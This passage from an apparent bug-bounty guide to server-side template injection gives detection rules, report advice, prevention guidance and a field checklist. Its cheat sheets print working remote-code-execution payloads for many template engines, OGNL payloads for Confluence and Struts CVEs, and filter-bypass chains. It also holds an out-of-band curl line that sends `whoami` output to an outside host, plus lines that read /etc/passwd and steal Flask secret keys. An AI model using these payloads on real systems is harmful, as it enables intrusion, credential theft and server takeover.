- Jinja2 → `cycler` globals → RCE; else `{{config}}`→SECRET_KEY.
- Twig/Smarty → `['id']|filter('system')` / `{system('id')}`.
- Freemarker/SpEL → `?new()("id")` / `T(java.lang.Runtime)...`.
- Java `${}`/`%{}` on Struts/Confluence → **OGNL CVE PoC** (unauth RCE).
- RCE blocked → sandbox escape / `|attr()`+`request.args` filter bypass; else file-read/`{{config}}` secrets.
- Blind → time/OOB. Client-side `{{}}` → **XSS** kit, not SSTI.

### Q95. False positives / auto-reject.
- A lone `{{7*7}}=49` with no differential / no engine / no impact.
- **Client-side** `{{}}` (Angular/Vue) → that's CSTI/XSS.
- `{{7*7}}` reflected **literally** as `7*7` (not evaluated).
- Only a template **error**/stack trace, no evaluation.
- `49` the page could already contain (use `1337*1338`).
- "tplmap said vulnerable" with no manual differential + impact.

### Q96. What makes a great report (severity)?
Title = the **impact** ("SSTI (Jinja2) in `<param>` → remote code execution"). Lead with RCE (or sandboxed
secret-disclosure = High). Include the differential proof, the engine, the payload + `id` output, CWE-1336(+94), and
own-tenant/benign discipline. One template sink = one finding; a client-side `{{}}` is an **XSS** report.

---

# CHEAT SHEETS

### Q97. Detection cheat sheet.
```
differential: {{1337*1338}}→1788906  AND  {{7*'7'}}→7777777   (server response, before JS)
delimiters:   {{ }}  ${ }  #{ }  <%= %>  { }    polyglot: ${{<%[%'"}}%\
rule out:     raw {{1337*1338}} reaches the browser + JS makes it a number = CSTI (XSS kit), NOT SSTI
```

### Q98. Engine → RCE cheat sheet.
```
Jinja2:    {{ cycler.__init__.__globals__.os.popen('id').read() }}   |  sandboxed: {{config['SECRET_KEY']}}
Twig:      {{ ['id']|filter('system') }}            Smarty: {system('id')}
Freemarker:<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
SpEL/Thyme:${T(java.lang.Runtime).getRuntime().exec("id")}   |  Velocity: #set(...Runtime...exec("id"))
ERB:       <%= `id` %>                              Mako: <%import os%>${os.popen('id').read()}
EJS/Pug/Nunjucks: …process.mainModule.require('child_process').execSync('id')…
```

### Q99. OGNL/EL cheat sheet (Java real-world).
```
Confluence CVE-2021-26084: '%2b#{@java.lang.Runtime@getRuntime().exec("id")}%2b'   (queryString/page params)
Confluence CVE-2022-26134: /%24%7B%28%23a%3D%40...Runtime%40getRuntime%28%29.exec%28%22id%22%29...%29%7D/   (URL path)
Struts2 CVE-2017-5638: OGNL in Content-Type header (published %{...exec('id')...} PoC)
Java EL: ${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(...,'id')}
```

### Q100. Sandbox/filter-bypass cheat sheet.
```
{{ }} blocked → {%print(7*7)%}   . blocked → |attr()/['..']   _ blocked → ['__cl'+'ass__'] or request.args smuggling
keyword blocked → {{ lipsum|attr(request.args.g)|attr('os')|attr('popen')('id')|attr('read')() }}  ?g=__globals__
quotes filtered → bring strings via request.args   [ ] blocked → |attr() everywhere
Jinja sandbox → globals via cycler/joiner/namespace / request.application.__globals__ ; |attr('__class__')
```

### Q101. Blind/secrets cheat sheet.
```
blind time:  {{ cycler.__init__.__globals__.os.popen('sleep 10').read() }}   (repeat vs baseline)
blind OOB:   {{ cycler.__init__.__globals__.os.popen('curl http://OOB/$(whoami)').read() }}   (carries output)
secrets:     {{config}} / {{config['SECRET_KEY']}}  (→ forge Flask sessions)   file: …open('/etc/passwd').read()
```

---

# REAL-WORLD CVEs & REFERENCES

### Q102. Real-world SSTI / expression-injection CVEs & patterns.
- **Atlassian Confluence OGNL** — CVE-2021-26084, CVE-2022-26134 (**unauth RCE**, mass-exploited).
- **Apache Struts2 OGNL** — CVE-2017-5638 (Content-Type header → RCE, the Equifax breach vector).
- **Spring SpEL injection** — numerous (`${T(java.lang.Runtime)…}` via evaluated params/headers).
- **Jinja2/Mako** in Python admin/email/report features → RCE; Flask `{{config}}` SECRET_KEY → forge sessions even if sandboxed.
- **Twig/Smarty** in PHP CMS/page-builder/template editors → RCE; **Craft CMS / Twig** advisories.
- **Handlebars/Pug/Nunjucks** in Node "email template"/"custom page" builders → RCE.
- **SSTI via uploaded office templates / JasperReports** → RCE in the renderer.
- Classic chain: **SSTI → RCE → cloud metadata creds → cloud takeover**.

### Q103. Resources to work through.
PortSwigger Academy → **Server-side template injection** labs + **James Kettle's SSTI research paper** (the foundational
write-up); PayloadsAllTheThings *Server Side Template Injection* (per-engine chains); HackTricks *SSTI*; `vladko312/SSTImap`
& tplmap; the OGNL/Confluence/Struts CVE write-ups; Hackviser & PentesterLab SSTI modules. Read disclosed reports tagged
"SSTI / template injection / RCE".

---

# DEFENSE — PREVENTING SSTI

### Q104. What's the secure design?
**Never concatenate user input into a template.** Pass it strictly as **data/variables** to a pre-defined template
(`render_template("hi.html", name=user)` — not `render_template_string("hi "+user)`). User data should fill
placeholders, never *become* the template.

### Q105. If users must supply templates (email/page builders)?
Use a **logic-less / sandboxed** engine (and keep it patched), with a **strict allowlist** of variables and filters and
**no access to runtime objects** (no `__class__`/`config`/`os`). Render in a **least-privilege, network-egress-restricted**
worker so even an escape is contained.

### Q106. How do I prevent OGNL/EL injection?
Patch Struts/Confluence/Spring (these are the big CVEs); don't evaluate user input as OGNL/SpEL/EL; disable
expression-language evaluation on user-controlled parameters/headers; use the framework's safe binding. For Spring, avoid
`SpelExpressionParser` on untrusted input.

### Q107. Defense in depth?
Run the renderer **least-privilege** with restricted egress (limits cloud-metadata reach from an escape); rotate any
secret a template could read (Flask `SECRET_KEY`); disable verbose template error pages in production (they leak the
engine/version); and add a WAF rule for template-injection tokens as a *secondary* control (not the primary fix).

### Q108. One-paragraph summary you can quote.
*"Server-side template injection happens when user input becomes part of the template instead of the data the template
renders — so the fix is to never concatenate user input into a template: pass it as variables to a pre-defined template,
and if users must supply templates, use a sandboxed/logic-less engine with a strict variable/filter allowlist and no
access to runtime objects, rendered in a least-privilege, egress-restricted worker. Patch the expression-language
frameworks (Struts/Confluence/Spring) that turn a reflected `${}`/`%{}` into unauthenticated remote code execution,
keep secrets (like Flask's SECRET_KEY) out of template scope and rotated, and don't leak the engine via verbose errors.
A single `{{7*7}}` that the server computes is one step from `{{cycler.__init__.__globals__.os.popen('id').read()}}` —
full server and cloud compromise — so input-as-data, not blacklisting, is the control that matters."*

---

## APPENDIX — 60-second SSTI field checklist
```
[ ] Recon: every server-rendered field + templates/email/PDF/report builders + Java apps reflecting ${}/%{}/#{}
[ ] DETECT differentially: {{1337*1338}}=1788906 AND {{7*'7'}}=7777777 (server-side) — RULE OUT CSTI/coincidence/reflection
[ ] FINGERPRINT the engine (decision tree) — or recognise OGNL/EL on Struts/Confluence/JSF
[ ] RCE: Jinja {{cycler…os.popen('id')…}} · Twig {{['id']|filter('system')}} · Freemarker ?new()("id") · SpEL T(Runtime) · ERB `id` · Node require(child_process)
[ ] OGNL/EL (§8.4): Struts CVE-2017-5638 / Confluence CVE-2021-26084 & CVE-2022-26134 published PoC → UNAUTH RCE
[ ] Sandbox/filter blocked? → globals via cycler/namespace · |attr()+['..'] · request.args smuggling (?g=__globals__)
[ ] Blind → time/OOB ($(whoami) callback) ; RCE blocked → {{config}} SECRET_KEY (forge sessions) / file read = High
[ ] CHAIN: SSTI→RCE→cloud metadata→takeover ; {{config}}→forge admin Flask session
[ ] PROVE with a benign marker (id) ; CWE-1336(+94) ; client-side {{}} = XSS not SSTI ; clean up ; one sink = one finding
```
*End of guide.*
